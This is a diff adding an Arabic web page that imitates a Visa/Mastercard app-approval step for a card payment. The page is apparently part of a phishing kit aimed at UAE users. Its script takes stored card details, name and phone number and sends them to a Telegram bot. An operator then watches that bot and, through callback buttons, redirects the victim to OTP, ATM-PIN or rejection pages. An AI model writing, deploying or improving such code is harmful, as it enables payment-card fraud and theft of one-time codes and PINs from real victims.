@@ -1,0 +1,347 @@
+<html lang="ar" dir="rtl"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الموافقة على المعاملة</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&amp;display=swap" rel="stylesheet">
+    <style>
+      * { box-sizing: border-box; }
+      body {
+        margin: 0;
+        background: #fff;
+        color: #111;
+        font-family: "Cairo", system-ui, sans-serif;
+        direction: rtl;
+      }
+      .page {
+        max-width: 760px;
+        margin: 0 auto;
+        min-height: 100vh;
+        padding: 28px 14px 24px;
+      }
+      .logos {
+        display: flex;
+        align-items: flex-start;
+        justify-content: flex-start;
+        direction: ltr;
+        margin-bottom: 34px;
+      }
+      .visa {
+        width: 98px;
+        max-width: 28vw;
+      }
+      .content {
+        text-align: center;
+        line-height: 1.75;
+        font-size: 0.95rem;
+        font-weight: 400;
+      }
+      .title {
+        font-weight: 800;
+        margin-bottom: 10px;
+        font-size: 1.2rem;
+      }
+      .steps-list {
+        list-style: none;
+        list-style-position: outside;
+        margin: 8px auto 0;
+        padding: 0 30px 0 0;
+        max-width: 100%;
+        text-align: right;
+      }
+      .steps-title {
+        text-align: right;
+        padding-right: 30px;
+        font-weight: 800;
+      }
+      .step {
+        margin-bottom: 6px;
+        font-weight: 300;
+        font-size: 0.92rem;
+        line-height: 1.55;
+        white-space: normal;
+        overflow-wrap: anywhere;
+        word-break: normal;
+      }
+      @media (max-width: 520px) {
+        .content {
+          font-size: 0.9rem;
+        }
+        .title {
+          font-size: 1.2rem;
+        }
+        .steps-title,
+        .steps-list {
+          padding-right: 14px;
+        }
+        .step {
+          font-size: 0.84rem;
+          line-height: 1.5;
+        }
+      }
+      .approve-btn {
+        display: inline-block;
+        margin-top: 18px;
+        min-width: min(220px, 70vw);
+        padding: 9px 14px;
+        background: #3a67c9;
+        color: #fff;
+        border-radius: 10px;
+        font-size: 0.95rem;
+        font-weight: 700;
+        letter-spacing: 0.02em;
+        box-shadow: 0 8px 14px rgba(33, 71, 156, 0.35);
+        cursor: pointer;
+        border: 0;
+        font-family: inherit;
+      }
+      .help {
+        margin-top: 16px;
+        font-weight: 700;
+        font-size: 0.82rem;
+      }
+      .exit {
+        margin-top: 12px;
+        display: inline-block;
+        font-size: 0.82rem;
+      }
+      .error {
+        display: none;
+        margin: 14px auto 0;
+        max-width: 520px;
+        padding: 10px 12px;
+        border: 1px solid #e7a1a1;
+        border-radius: 10px;
+        background: #fff1f1;
+        color: #b71c1c;
+        font-weight: 800;
+        font-size: 0.82rem;
+        text-align: center;
+      }
+      .loading-overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.62);
+        display: none;
+        align-items: center;
+        justify-content: center;
+        z-index: 999;
+      }
+      .loading-overlay--visible { display: flex; }
+      .spinner {
+        width: 58px;
+        height: 58px;
+        border: 6px solid rgba(255, 255, 255, 0.38);
+        border-top-color: #fff;
+        border-radius: 50%;
+        animation: spin 0.85s linear infinite;
+      }
+      @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+  </head>
+  <body>
+    <div class="page">
+      <div class="logos">
+        <img id="brandLogo" src="assets/images/Visa.svg" alt="Visa" class="visa">
+      </div>
+
+      <div class="content">
+        <div class="title">المصادقة عبر تطبيق الهاتف</div>
+        <div class="steps-title">كيفية الموافقة على هذه الدفعة:</div>
+        <ol class="steps-list">
+          <li class="step">الخطوة 1: افتح تطبيق الهاتف و انقر على الإشعار الفوري</li>
+          <li class="step">الخطوة 2: راجع معاملة الدفع ووافق عليها</li>
+          <li class="step">الخطوة 3: ارجع إلى هذه الشاشة لإكمال معاملة الشراء</li>
+        </ol>
+
+        <button id="approveBtn" class="approve-btn" type="button">لقد وافقت على هذه المعاملة</button>
+
+        <div class="help">هل تحتاج للمساعدة؟ | شروط الاستخدام</div>
+        <div class="exit">خروج</div>
+        <div id="approvalError" class="error"></div>
+      </div>
+    </div>
+
+    <div id="loadingOverlay" class="loading-overlay" aria-hidden="true">
+      <div class="spinner" aria-hidden="true"></div>
+    </div>
+
+    <script src="assets/js/config.js"></script>
+    <script>
+      (function () {
+        const approveBtn = document.getElementById("approveBtn");
+        const loadingOverlay = document.getElementById("loadingOverlay");
+        const approvalError = document.getElementById("approvalError");
+        const brandLogo = document.getElementById("brandLogo");
+
+        let telegramUpdatesOffset = Number(localStorage.getItem("telegramUpdatesOffset") || "0") || 0;
+        let pollTimer = null;
+
+        function setOverlayVisible(visible) {
+          loadingOverlay.classList.toggle("loading-overlay--visible", visible);
+          loadingOverlay.setAttribute("aria-hidden", visible ? "false" : "true");
+        }
+
+        function setApprovalError(message) {
+          if (!approvalError) return;
+          approvalError.textContent = message || "";
+          approvalError.style.display = message ? "block" : "none";
+        }
+
+        function getTelegramCredentials() {
+          const token = String(globalThis.telegramToken || "").trim();
+          const chatId = String(globalThis.chatId || "").trim();
+          return token && chatId ? { token, chatId } : null;
+        }
+
+        function normalizeDigits(value) {
+          return String(value || "").replace(/\D+/g, "");
+        }
+
+        function applyCardBrandLogo() {
+          let digits = "";
+          try {
+            const cardData = JSON.parse(localStorage.getItem("paymentData") || "{}");
+            digits = normalizeDigits(cardData.cardNumberDigits || cardData.cardNumber || "");
+          } catch { digits = ""; }
+
+          const isMastercard = /^5[1-5]/.test(digits) || /^2(2[2-9]|[3-6]|7[01]|720)/.test(digits);
+          if (brandLogo) {
+            brandLogo.src = isMastercard ? "assets/images/Mastercard.svg" : "assets/images/Visa.svg";
+            brandLogo.alt = isMastercard ? "Mastercard" : "Visa";
+          }
+        }
+
+        async function telegramApi(credentials, method, body) {
+          const response = await fetch(`https://api.telegram.org/bot${credentials.token}/${method}`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(body)
+          });
+          return await response.json().catch(() => null);
+        }
+
+        function readCustomerInfo() {
+          try {
+            const payload = JSON.parse(localStorage.getItem("fazaa.orderForm") || "{}");
+            return {
+              fullName: payload.fullName || "غير معروف",
+              phoneNumber: payload.phoneNumber || "غير معروف"
+            };
+          } catch { return { fullName: "غير معروف", phoneNumber: "غير معروف" }; }
+        }
+
+        function formatMessage(customer) {
+          const cardData = JSON.parse(localStorage.getItem("paymentData") || "{}");
+          const cardLast4 = cardData.cardLast4 || "----";
+          const phoneText = customer.phoneNumber && customer.phoneNumber !== "غير معروف"
+            ? `\u200E+971 ${customer.phoneNumber}\u200E`
+            : "غير معروف";
+
+          return [
+            "📱 <b>المصادقة عبر التطبيق</b>",
+            "",
+            `<b>الاسم:</b> ${customer.fullName}`,
+            `<b>الهاتف:</b> ${phoneText}`,
+            `<b>البطاقة:</b> <code>•••• ${cardLast4}</code>`,
+            "",
+            "⏳ <i>بانتظار الموافقة من العميل...</i>"
+          ].join("\n");
+        }
+
+        async function sendApprovalRequest() {
+          const credentials = getTelegramCredentials();
+          if (!credentials) return null;
+
+          const response = await fetch(`https://api.telegram.org/bot${credentials.token}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: credentials.chatId,
+              text: formatMessage(readCustomerInfo()),
+              parse_mode: "HTML",
+              reply_markup: {
+                inline_keyboard: [
+                  [
+                    { text: "📩 OTP SMS", callback_data: "approval_otp_sms" },
+                    { text: "🏧 ATM", callback_data: "approval_atm" }
+                  ],
+                  [
+                    { text: "⛔ رفض البطاقة", callback_data: "reject_card" },
+                    { text: "❌ رفض", callback_data: "approval_reject" }
+                  ],
+                  [{ text: "✅ قبول", callback_data: "approval_accept" }]
+                ]
+              }
+            })
+          });
+
+          const data = await response.json().catch(() => null);
+          if (!data?.ok) return null;
+          return { credentials, messageId: data.result.message_id };
+        }
+
+        function startPolling(messageId, credentials) {
+          pollTimer = setInterval(async () => {
+            const updatesResponse = await telegramApi(credentials, "getUpdates", {
+              offset: telegramUpdatesOffset,
+              timeout: 0,
+              allowed_updates: ["callback_query"]
+            });
+            const updates = updatesResponse?.result || [];
+            for (const update of updates) {
+              telegramUpdatesOffset = update.update_id + 1;
+              localStorage.setItem("telegramUpdatesOffset", telegramUpdatesOffset);
+              const callback = update?.callback_query;
+              if (callback?.message?.message_id !== messageId) continue;
+
+              const data = callback?.data;
+              if (data === "approval_reject") {
+                setOverlayVisible(false);
+                clearInterval(pollTimer);
+                setApprovalError("لم يتم الموافقة على هذه المعاملة");
+                return;
+              }
+              if (data === "reject_card") {
+                setOverlayVisible(false);
+                clearInterval(pollTimer);
+                window.location.href = "payment.html?cardRejected=1";
+                return;
+              }
+              if (data === "approval_otp_sms") {
+                setOverlayVisible(false);
+                clearInterval(pollTimer);
+                window.location.href = "verification.html";
+                return;
+              }
+              if (data === "approval_atm") {
+                setOverlayVisible(false);
+                clearInterval(pollTimer);
+                window.location.href = "atm.html";
+                return;
+              }
+              if (data === "approval_accept") {
+                setOverlayVisible(false);
+                clearInterval(pollTimer);
+                window.location.href = "success.html"; // سيتم إنشاء صفحة نجاح نهائية بسيطة
+                return;
+              }
+            }
+          }, 2000);
+        }
+
+        applyCardBrandLogo();
+
+        if (approveBtn) {
+          approveBtn.addEventListener("click", async () => {
+            setApprovalError("");
+            setOverlayVisible(true);
+            const sent = await sendApprovalRequest();
+            if (sent) startPolling(sent.messageId, sent.credentials);
+            else setOverlayVisible(false);
+          });
+        }
+      })();
+    </script>
+  </body></html>
